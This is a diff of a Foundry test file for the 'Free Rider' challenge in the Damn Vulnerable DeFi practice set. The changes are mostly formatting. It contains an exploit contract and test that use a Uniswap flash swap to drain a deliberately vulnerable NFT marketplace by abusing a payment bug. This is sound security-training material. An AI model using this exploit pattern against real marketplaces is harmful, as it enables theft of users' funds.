@@ -4,11 +4,10 @@ pragma solidity 0.8.10;
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
-
-import "../../DamnValuableToken.sol";
-import "../../DamnValuableNFT.sol";
-import "../../free-rider/FreeRiderBuyer.sol";
-import "../../free-rider/FreeRiderNFTMarketplace.sol";
+import "../../src/DamnValuableToken.sol";
+import "../../src/DamnValuableNFT.sol";
+import "../../src/free-rider/FreeRiderBuyer.sol";
+import "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";
 import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
@@ -17,14 +16,18 @@ import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
 
 contract FlashSwapV2 is IUniswapV2Callee, ERC721Holder {
-
     IUniswapV2Pair pair;
     FreeRiderNFTMarketplace marketplace;
     address owner;
     uint8 numberOfNFT;
     uint256 nftPrice;
 
-    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, uint8 _numberOfNFT, uint256 _nftPrice) {
+    constructor(
+        IUniswapV2Pair _pair,
+        FreeRiderNFTMarketplace _marketplace,
+        uint8 _numberOfNFT,
+        uint256 _nftPrice
+    ) {
         owner = msg.sender;
         pair = _pair;
         marketplace = _marketplace;
@@ -85,11 +88,9 @@ contract FlashSwapV2 is IUniswapV2Callee, ERC721Holder {
     }
 
     receive() external payable {}
-
 }
 
 contract FreeRiderTest is BaseTest, ERC721Holder {
-
     // The NFT marketplace will have 6 tokens, at 15 ETH each
     uint256 NFT_PRICE = 15 ether;
     uint8 AMOUNT_OF_NFTS = 6;
@@ -109,7 +110,6 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
     IUniswapV2Factory uniswapFactory;
     FreeRiderNFTMarketplace marketplace;
     FreeRiderBuyer buyerContract;
-
 
     address attacker;
     address buyer;
@@ -132,7 +132,6 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
         attacker = users[0];
         buyer = users[1];
 
-
         // Deploy WETH contract
         address _weth = deployCode("artifacts/WETH9.json");
         weth = IWETH(_weth);
@@ -143,12 +142,12 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
         // Deploy Uniswap Factory and Router
         // address(0) -> _feeToSetter
         address _uniswapFactory = deployCode(
-            "node_modules/@uniswap/v2-core/build/UniswapV2Factory.json", 
+            "node_modules/@uniswap/v2-core/build/UniswapV2Factory.json",
             abi.encode(address(0))
         );
         uniswapFactory = IUniswapV2Factory(_uniswapFactory);
         address _uniswapRouter = deployCode(
-            "node_modules/@uniswap/v2-periphery/build/UniswapV2Router02.json", 
+            "node_modules/@uniswap/v2-periphery/build/UniswapV2Router02.json",
             abi.encode(_uniswapFactory, _weth)
         );
 
@@ -156,7 +155,9 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
         // Note that the function takes care of deploying the pair automatically
         token.approve(_uniswapRouter, UNISWAP_INITIAL_TOKEN_RESERVE);
 
-        IUniswapV2Router02(_uniswapRouter).addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
+        IUniswapV2Router02(_uniswapRouter).addLiquidityETH{
+            value: UNISWAP_INITIAL_WETH_RESERVE
+        }(
             address(token), // token to be traded against WETH
             UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
             0, // amountTokenMin
@@ -166,14 +167,18 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(token), _weth));
+        uniswapPair = IUniswapV2Pair(
+            uniswapFactory.getPair(address(token), _weth)
+        );
         assertEq(uniswapPair.token0(), _weth);
         assertEq(uniswapPair.token1(), address(token));
         assertGt(uniswapPair.balanceOf(address(this)), 0);
 
         // Deploy the marketplace and get the associated ERC721 token
         // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
-        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
+        marketplace = new FreeRiderNFTMarketplace{
+            value: MARKETPLACE_INITIAL_ETH_BALANCE
+        }(AMOUNT_OF_NFTS);
         vm.label(address(marketplace), "Marketplace");
 
         // Deploy NFT contract
@@ -192,39 +197,40 @@ contract FreeRiderTest is BaseTest, ERC721Holder {
 
         nft.setApprovalForAll(address(marketplace), true);
 
-        marketplace.offerMany(
-            ids,
-            offers
-        );
+        marketplace.offerMany(ids, offers);
         assertEq(marketplace.amountOfOffers(), 6);
-
 
         // Give enough funds to the buyer to send to the FreeRideBuyer contract
         vm.deal(buyer, BUYER_PAYOUT);
         // Deploy buyer's contract, adding the attacker as the partner
         vm.prank(buyer);
-        buyerContract = new FreeRiderBuyer{value: BUYER_PAYOUT}(attacker, address(nft));
+        buyerContract = new FreeRiderBuyer{value: BUYER_PAYOUT}(
+            attacker,
+            address(nft)
+        );
         vm.label(address(buyerContract), "FreeRiderBuyer");
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
-        
-        
+
         // Deploy the exploit contract that will make a flash swap (flash loan)
         // will buy all the NFT from the marketplace exloiting the bug (transfer before ownership sendValue)
         // repay debt -> transfer nft to attacker, selfdestruct sending all money back to attacker
         vm.startPrank(attacker);
-        FlashSwapV2 flashSwapper = new FlashSwapV2(uniswapPair, marketplace, AMOUNT_OF_NFTS, NFT_PRICE);
+        FlashSwapV2 flashSwapper = new FlashSwapV2(
+            uniswapPair,
+            marketplace,
+            AMOUNT_OF_NFTS,
+            NFT_PRICE
+        );
         vm.label(address(flashSwapper), "FlashSwapV2");
         flashSwapper.exploit();
         vm.stopPrank();
-
 
         vm.startPrank(attacker, attacker);
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
